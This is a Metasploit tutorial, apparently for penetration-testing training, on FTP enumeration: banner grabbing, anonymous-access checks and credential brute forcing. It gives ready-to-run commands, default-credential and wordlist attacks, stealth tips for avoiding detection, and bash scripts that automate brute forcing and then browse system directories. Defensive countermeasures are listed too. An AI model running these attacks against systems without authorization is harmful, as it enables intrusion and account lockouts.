# 🎯 Metasploit - FTP Enumeration Modules

This section covers Metasploit auxiliary modules for comprehensive FTP service enumeration and security testing.

## 📋 Table of Contents
- [Purpose](#-purpose)
- [Module Overview](#-module-overview)
- [Prerequisites](#-prerequisites)
- [FTP Version Detection](#-1-ftp-version-detection)
- [Anonymous Access Testing](#-2-anonymous-access-testing)
- [Credential Testing](#-3-credential-testing)
- [Manual FTP Interaction](#-4-manual-ftp-interaction)
- [Advanced Techniques](#-5-advanced-techniques)
- [Output Analysis](#-6-output-analysis-and-interpretation)
- [Integration with Other Tools](#-7-integration-with-other-tools)
- [Troubleshooting](#-troubleshooting)
- [Security Considerations](#-security-considerations)
- [References](#-references)

---

## 🎯 Purpose

Metasploit FTP modules help you:
- Detect FTP server versions and software information
- Test for anonymous access to FTP services
- Perform credential brute-force attacks against FTP
- Enumerate FTP directories and file permissions
- Validate FTP security configurations
- Gather reconnaissance data for exploitation planning

---

## 🗂️ Module Overview

| Module | Purpose | Authentication | Risk Level |
|--------|---------|----------------|------------|
| `ftp_version` | Banner grabbing and version detection | ❌ | 🟢 Low |
| `ftp_anonymous` | Anonymous access testing | ❌ | 🟡 Medium |
| `ftp_login` | Credential brute-force testing | ❌ | 🔴 High |

---

## 📋 Prerequisites

### Environment Setup:
```bash
# Start Metasploit
msfconsole -q

# Update Metasploit (if needed)
msfupdate

# Check available FTP modules
search type:auxiliary ftp
```

### Target Requirements:
- FTP service running (port 21/tcp)
- Network connectivity to target
- Proper authorization for testing

### Quick Service Check:
```bash
# From Metasploit console
use auxiliary/scanner/portscan/tcp
set RHOSTS <target-ip>
set PORTS 21
run
```

---

## 🔧 Metasploit FTP Modules

## 🏷️ 1. FTP Version Detection

### Module: `auxiliary/scanner/ftp/ftp_version`

**📌 Purpose:**
Grab FTP banner and version information for service fingerprinting and vulnerability research.

**🔧 Basic Usage:**
```bash
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target-ip>
run
```

**⚙️ Module Options:**
| Option | Description | Default | Example |
|--------|-------------|---------|---------|
| `RHOSTS` | Target host(s) | - | `192.168.1.100` |
| `RPORT` | Target port | `21` | `2121` |
| `THREADS` | Scan threads | `1` | `10` |
| `ConnectTimeout` | Connection timeout | `10` | `5` |

**📌 INE Lab Example:**
```bash
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run
```

**📸 Sample Output:**
```bash
[*] 192.220.69.3:21 - FTP Banner: '220 (vsFTPd 3.0.3)\x0d\x0a'
[+] 192.220.69.3:21 - FTP Server: vsFTPd 3.0.3
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**🔍 Advanced Configuration:**
```bash
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
set THREADS 20
set ConnectTimeout 5
run
```

### Output Analysis:
- **Banner Information**: Raw FTP greeting message
- **Server Software**: Identified FTP server (vsFTPd, ProFTPD, FileZilla, etc.)
- **Version Details**: Specific version for CVE research
- **Platform Hints**: May indicate underlying OS

**🚨 Security Implications:**
- Version disclosure enables targeted exploit research
- Banner information reveals server configuration
- Older versions may have known vulnerabilities

**💡 Follow-up Actions:**
- Research CVEs for discovered version
- Check for version-specific exploits
- Plan targeted enumeration based on server type

---

## 🔓 2. Anonymous Access Testing

### Module: `auxiliary/scanner/ftp/ftp_anonymous`

**📌 Purpose:**
Test for anonymous FTP access and enumerate accessible directories and files.

**🔧 Basic Usage:**
```bash
use auxiliary/scanner/ftp/ftp_anonymous
set RHOSTS <target-ip>
run
```

**⚙️ Module Options:**
| Option | Description | Default | Example |
|--------|-------------|---------|---------|
| `RHOSTS` | Target host(s) | - | `192.168.1.100` |
| `RPORT` | FTP port | `21` | `2121` |
| `FTPUSER` | Anonymous username | `anonymous` | `ftp` |
| `FTPPASS` | Anonymous password | `mozilla@example.com` | `anonymous` |

**📌 INE Lab Example:**
```bash
use auxiliary/scanner/ftp/ftp_anonymous
set RHOSTS demo.ine.local
set VERBOSE true
run
```

**📸 Sample Output:**
```bash
[*] 192.220.69.3:21 - Attempting FTP anonymous login...
[+] 192.220.69.3:21 - Anonymous READ (drwxr-xr-x ftp ftp 4096 Sep 16 12:00 .)
[+] 192.220.69.3:21 - Anonymous READ (drwxr-xr-x ftp ftp 4096 Sep 16 12:00 ..)
[+] 192.220.69.3:21 - Anonymous READ (-rw-r--r-- ftp ftp 156 Sep 16 12:00 readme.txt)
[+] 192.220.69.3:21 - Anonymous READ (drwxrwxrwx ftp ftp 4096 Sep 16 12:00 uploads)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Directory Permission Analysis:
- **READ permissions**: Files/directories accessible for download
- **WRITE permissions**: Directories writable for upload
- **File types**: Configuration files, logs, backups of interest

**🎯 High-Value Findings:**
- Writable directories (potential upload locations)
- Configuration files (.conf, .ini, .xml)
- Log files containing sensitive information
- Backup files with credentials or data

**🔍 Advanced Anonymous Testing:**
```bash
# Test multiple anonymous usernames
use auxiliary/scanner/ftp/ftp_anonymous
set RHOSTS <target>
set FTPUSER ftp
run

# Test with different email formats
set FTPPASS user@domain.com
run
```

---

## 🔐 3. Credential Testing

### Module: `auxiliary/scanner/ftp/ftp_login`

**📌 Purpose:**
Perform brute-force authentication testing against FTP services using credential lists.

**⚠️ WARNING:** This module can lock accounts and trigger security alerts. Use with extreme caution and proper authorization.

**🔧 Basic Usage:**
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target-ip>
set USERNAME admin
set PASSWORD password123
run
```

**⚙️ Module Options:**
| Option | Description | Default | Example |
|--------|-------------|---------|---------|
| `USERNAME` | Single username | - | `admin` |
| `PASSWORD` | Single password | - | `password123` |
| `USER_FILE` | Username wordlist | - | `/path/to/users.txt` |
| `PASS_FILE` | Password wordlist | - | `/path/to/passwords.txt` |
| `USERPASS_FILE` | Combined user:pass file | - | `/path/to/creds.txt` |
| `STOP_ON_SUCCESS` | Stop after first success | `false` | `true` |
| `BRUTEFORCE_SPEED` | Attack speed (1-5) | `5` | `2` |
| `THREADS` | Parallel threads | `1` | `3` |

**📝 Wordlist-Based Attack:**
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/wordlists/seclists/Usernames/Names/names.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set THREADS 3
set BRUTEFORCE_SPEED 2
run
```

**🎯 Credential Spraying:**
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.0/24
set USERNAME admin
set PASSWORD password123
set THREADS 5
run
```

**📸 Sample Output:**
```bash
[*] 192.220.69.3:21 - Starting FTP login sweep
[-] 192.220.69.3:21 - FTP - Failed: 'admin:admin'
[-] 192.220.69.3:21 - FTP - Failed: 'admin:password'
[+] 192.220.69.3:21 - FTP - Success: 'admin:password123'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Result Analysis:
- **Successful Logins**: Valid credentials discovered
- **Failed Attempts**: Recorded for pattern analysis
- **Account Lockouts**: May indicate security policies

**🎯 Common Default Credentials to Test:**
```
admin:admin
admin:password
ftp:ftp
user:user
anonymous:anonymous
root:root
guest:guest
```

**💡 Best Practices:**
- Use `STOP_ON_SUCCESS true` to minimize noise
- Set low `THREADS` (1-3) to avoid detection
- Use `BRUTEFORCE_SPEED 1-2` for slower, stealthier attacks
- Test common passwords first before large wordlists

---

## 💻 4. Manual FTP Interaction

### Using Built-in FTP Client:
After finding credentials, use manual FTP interaction for detailed enumeration:

```bash
ftp <target-ip>
```

**📌 Post-Authentication Commands:**
```bash
# Navigation
ftp> pwd                    # Print working directory
ftp> ls                     # List directory contents
ftp> dir                    # Detailed listing
ftp> cd directory           # Change directory
ftp> cdup                   # Go to parent directory

# File Operations
ftp> get filename           # Download file
ftp> put filename           # Upload file
ftp> mget *.txt            # Download multiple files
ftp> mput *.doc            # Upload multiple files

# System Information
ftp> syst                  # System information
ftp> stat                  # Connection status
ftp> remotehelp           # Server help

# Transfer Settings
ftp> binary               # Binary transfer mode
ftp> ascii                # ASCII transfer mode
ftp> passive              # Toggle passive mode
ftp> prompt               # Toggle prompting
```

### Automated File Enumeration:
```bash
#!/bin/bash
# Automated FTP file enumeration after credential discovery

TARGET=$1
USERNAME=$2
PASSWORD=$3

if [[ -z "$TARGET" || -z "$USERNAME" || -z "$PASSWORD" ]]; then
    echo "Usage: $0 <target> <username> <password>"
    exit 1
fi

echo "=== Automated FTP Enumeration ==="
echo "Target: $TARGET"
echo "Credentials: $USERNAME:$PASSWORD"
echo

# Create FTP command file
cat > /tmp/ftp_enum.txt << EOF
open $TARGET
user $USERNAME $PASSWORD
binary
pwd
ls -la
cd /
ls -la
cd /etc
ls -la
cd /var/log
ls -la
cd /home
ls -la
quit
EOF

# Execute enumeration
echo "Starting enumeration..."
ftp -n < /tmp/ftp_enum.txt > ftp_enumeration_results.txt 2>&1

# Extract interesting files
echo "Extracting file information..."
grep -E "^-.*\.(txt|log|conf|ini|xml|bak|sql)$" ftp_enumeration_results.txt > interesting_files.txt

if [[ -s interesting_files.txt ]]; then
    echo "Found interesting files:"
    cat interesting_files.txt
else
    echo "No obviously interesting files found"
fi

# Cleanup
rm -f /tmp/ftp_enum.txt
echo "Results saved to ftp_enumeration_results.txt"
```

---

## 🚀 5. Advanced Techniques

### Database Integration:
```bash
# Enable workspace
workspace -a ftp_assessment

# Run version detection (results auto-saved)
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run

# Query results
hosts
services -p 21
```

### Automated FTP Assessment:
```bash
#!/bin/bash
# Comprehensive FTP assessment using Metasploit

TARGET_RANGE=$1
if [[ -z "$TARGET_RANGE" ]]; then
    echo "Usage: $0 <target_range>"
    exit 1
fi

echo "=== Automated FTP Assessment ==="
echo "Target Range: $TARGET_RANGE"

# Create Metasploit resource file
cat > /tmp/ftp_assessment.rc << EOF
workspace -a ftp_assessment_$(date +%Y%m%d_%H%M%S)

use auxiliary/scanner/ftp/ftp_version
set RHOSTS $TARGET_RANGE
set THREADS 20
run

use auxiliary/scanner/ftp/ftp_anonymous
set RHOSTS $TARGET_RANGE
set THREADS 10
run

use auxiliary/scanner/ftp/ftp_login
set RHOSTS $TARGET_RANGE
set USERNAME admin
set PASSWORD password123
set THREADS 5
run

use auxiliary/scanner/ftp/ftp_login
set RHOSTS $TARGET_RANGE
set USERNAME ftp
set PASSWORD ftp
set THREADS 5
run

hosts
services -p 21
creds
EOF

# Run assessment
msfconsole -q -r /tmp/ftp_assessment.rc

# Cleanup
rm -f /tmp/ftp_assessment.rc
```

### Custom Brute-Force Lists:
```bash
# Create targeted username list
echo -e "admin\nftp\nuser\nguest\nroot\noperator" > ftp_users.txt

# Create common password list
echo -e "password\n123456\nadmin\nftp\npassword123\nqwerty" > ftp_passwords.txt

# Use in Metasploit
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target>
set USER_FILE ftp_users.txt
set PASS_FILE ftp_passwords.txt
set STOP_ON_SUCCESS true
run
```

---

## 🔍 6. Output Analysis and Interpretation

### Version Detection Analysis:

**vsFTPd Server:**
```bash
[+] 192.168.1.100:21 - FTP Server: vsFTPd 3.0.3
```
- **Analysis**: Very Secure FTP Daemon on Linux
- **Security**: Generally secure, check for version-specific CVEs
- **Follow-up**: Research vsFTPd 3.0.3 vulnerabilities

**ProFTPD Server:**
```bash
[+] 192.168.1.100:21 - FTP Server: ProFTPD 1.3.5a
```
- **Analysis**: Professional FTP daemon
- **Security**: History of vulnerabilities, version check critical
- **Follow-up**: Search for ProFTPD 1.3.5a exploits

**FileZilla Server:**
```bash
[+] 192.168.1.100:21 - FTP Server: FileZilla Server 0.9.60
```
- **Analysis**: Windows-based FTP server
- **Security**: GUI-managed, check for default configurations
- **Follow-up**: Test for weak administrative passwords

### Anonymous Access Analysis:

**Read-Only Access:**
```bash
[+] 192.168.1.100:21 - Anonymous READ (drwxr-xr-x ftp ftp 4096 Sep 16 12:00 documents)
```
- **Risk Level**: Medium - Information disclosure
- **Action**: Enumerate and download accessible files

**Read-Write Access:**
```bash
[+] 192.168.1.100:21 - Anonymous READ (drwxrwxrwx ftp ftp 4096 Sep 16 12:00 uploads)
```
- **Risk Level**: High - Potential for malware upload
- **Action**: Test file upload capabilities carefully

### Credential Testing Analysis:

**Successful Authentication:**
```bash
[+] 192.168.1.100:21 - FTP - Success: 'admin:password123'
```
- **Impact**: Unauthorized access to FTP server
- **Next Steps**: Manual enumeration of accessible files
- **Risk**: Data exfiltration or system compromise

---

## 🔗 7. Integration with Other Tools

### With Nmap:
```bash
# Nmap FTP enumeration
nmap -p 21 --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor <target>

# Follow up with Metasploit
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
run
```

### With Hydra:
```bash
# Compare results with Hydra
hydra -l admin -P passwords.txt ftp://<target>

# Validate with Metasploit
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target>
set USERNAME admin
set PASS_FILE passwords.txt
run
```

### Pipeline Integration:
```bash
#!/bin/bash
# FTP enumeration to exploitation pipeline

TARGET=$1
OUTPUT_DIR="ftp_assessment"
mkdir -p $OUTPUT_DIR

echo "=== FTP Assessment Pipeline ==="

# Step 1: Service detection with Nmap
echo "Step 1: Service detection"
nmap -p 21 --script ftp-anon,ftp-syst $TARGET > $OUTPUT_DIR/nmap_ftp.txt

# Step 2: Metasploit enumeration
echo "Step 2: Metasploit enumeration"
cat > $OUTPUT_DIR/msf_enum.rc << EOF
use auxiliary/scanner/ftp/ftp_version
set RHOSTS $TARGET
run
use auxiliary/scanner/ftp/ftp_anonymous
set RHOSTS $TARGET
run
exit
EOF

msfconsole -q -r $OUTPUT_DIR/msf_enum.rc > $OUTPUT_DIR/msf_results.txt

# Step 3: Manual validation
echo "Step 3: Manual validation"
if grep -q "Anonymous login allowed" $OUTPUT_DIR/nmap_ftp.txt; then
    echo "Testing anonymous access..."
    curl ftp://$TARGET/ > $OUTPUT_DIR/anonymous_listing.txt 2>&1
fi

# Step 4: Credential testing (if authorized)
if [[ "$2" == "brute" ]]; then
    echo "Step 4: Credential testing"
    cat > $OUTPUT_DIR/msf_brute.rc << EOF
use auxiliary/scanner/ftp/ftp_login
set RHOSTS $TARGET
set USERNAME admin
set PASSWORD password123
set STOP_ON_SUCCESS true
run
exit
EOF
    
    msfconsole -q -r $OUTPUT_DIR/msf_brute.rc >> $OUTPUT_DIR/msf_results.txt
fi

echo "Assessment complete. Results in $OUTPUT_DIR/"
```

---

## 🛠️ Troubleshooting

### Common Issues and Solutions:

| Issue | Error Message | Solution |
|-------|---------------|----------|
| **Module Not Found** | `Failed to load module` | Update Metasploit framework |
| **Connection Timeout** | `Connection timed out` | Check network connectivity |
| **Authentication Failed** | `Login failed` | Verify credentials or try anonymous |
| **Too Many Connections** | `Too many connections` | Reduce THREADS setting |
| **Account Lockout** | `Account locked` | Wait for lockout period or try different accounts |

### Debugging Commands:
```bash
# Check Metasploit version
version

# Update framework
msfupdate

# Test basic connectivity
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
set PORTS 21
run

# Enable verbose output
set VERBOSE true
```

### Performance Optimization:
```bash
# Faster scanning for large networks
set THREADS 20
set ConnectTimeout 3

# Slower, stealthier brute force
set BRUTEFORCE_SPEED 1
set THREADS 1

# Memory optimization
unset VERBOSE
```

---

## ⚠️ Security Considerations

### Legal and Ethical Guidelines:
- **Written Authorization**: Always obtain proper authorization before testing
- **Scope Compliance**: Only test systems explicitly included in scope
- **Data Protection**: Handle discovered data responsibly
- **Account Lockout Awareness**: Brute-force attacks can lock legitimate accounts

### Operational Security:
- **Logging Impact**: Metasploit activities generate extensive logs
- **Network Detection**: FTP brute-force attempts are easily monitored
- **Account Policies**: Failed login attempts may trigger lockouts
- **Timing**: Use slower attack speeds to avoid detection

### Detection Indicators:
- **FTP Server Logs**: Connection attempts, failed logins
- **Network Monitoring**: Unusual FTP traffic patterns
- **Security Alerts**: Multiple failed authentication attempts
- **Account Lockouts**: Mass account lockout events

### Defensive Countermeasures:
- **Disable Anonymous Access**: Require authentication for all FTP access
- **Strong Authentication**: Implement complex passwords and MFA
- **Account Lockout Policies**: Automatically lock accounts after failed attempts
- **Network Monitoring**: Deploy FTP-specific monitoring and alerting
- **Service Hardening**: Use SFTP/FTPS instead of plain FTP

### Risk Assessment:
| Activity | Detection Risk | Impact | Recommendation |
|----------|----------------|--------|----------------|
| Version Detection | 🟢 Low | 🟢 Low | Generally safe |
| Anonymous Testing | 🟡 Medium | 🟡 Medium | Monitor access patterns |
| Credential Testing | 🔴 High | 🔴 High | Use with extreme caution |
| File Access | 🟠 High | 🟠 High | Only access authorized data |

---

## 📖 References

### Official Documentation:
- [Metasploit Framework](https://docs.rapid7.com/metasploit/) - Official documentation
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) - Free training course
- [Rapid7 Blog](https://blog.rapid7.com/) - Latest research and techniques

### Security Research:
- [FTP Security Issues](https://www.sans.org/reading-room/whitepapers/protocols/ftp-security-1327) - SANS research
- [Common FTP Vulnerabilities](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=ftp) - CVE database
- [FTP Protocol Analysis](https://tools.ietf.org/html/rfc959) - RFC 959 specification

### Learning Resources:
- [Penetration Testing with Metasploit](https://www.packtpub.com/product/mastering-metasploit/9781788623179) - Advanced techniques
- [FTP Enumeration Guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp) - Comprehensive methodology
- [Metasploit Community](https://community.rapid7.com/) - User discussions and support

---

## 📋 Quick Reference

### Essential Commands:
```bash
# Version detection
use auxiliary/scanner/ftp/ftp_version; set RHOSTS <target>; run

# Anonymous testing
use auxiliary/scanner/ftp/ftp_anonymous; set RHOSTS <target>; run

# Credential testing
use auxiliary/scanner/ftp/ftp_login; set RHOSTS <target>; set USERNAME admin; set PASSWORD password123; run
```

### Module Priority:
1. **High Priority**: `ftp_version` (always run first)
2. **Medium Priority**: `ftp_anonymous` (test for misconfigurations)
3. **Use with Caution**: `ftp_login` (can cause account lockouts)

### Key Information to Collect:
- FTP server software and version
- Anonymous access status and permissions
- Valid credentials discovered
- Accessible files and directories
- Write permissions and upload capabilities

### Follow-up Tools:
1. Manual FTP client for detailed enumeration
2. Nmap FTP scripts for cross-validation
3. File download tools (wget, curl)
4. Exploit modules for vulnerable versions

### Success Indicators:
- Server version identified
- Anonymous access confirmed
- Valid credentials discovered
- File system access obtained

### Time Estimates:
- **Version detection**: 30 seconds per host
- **Anonymous testing**: 1-2 minutes per host
- **Credential testing**: 5+ minutes (depending on wordlist)
- **Full enumeration**: 10-30 minutes per host

---

**Last Updated**: September 2025  
**Version**: 2.0  
**Author**: Penetration Testing Team

---

*Always ensure proper authorization before conducting FTP security assessments.*
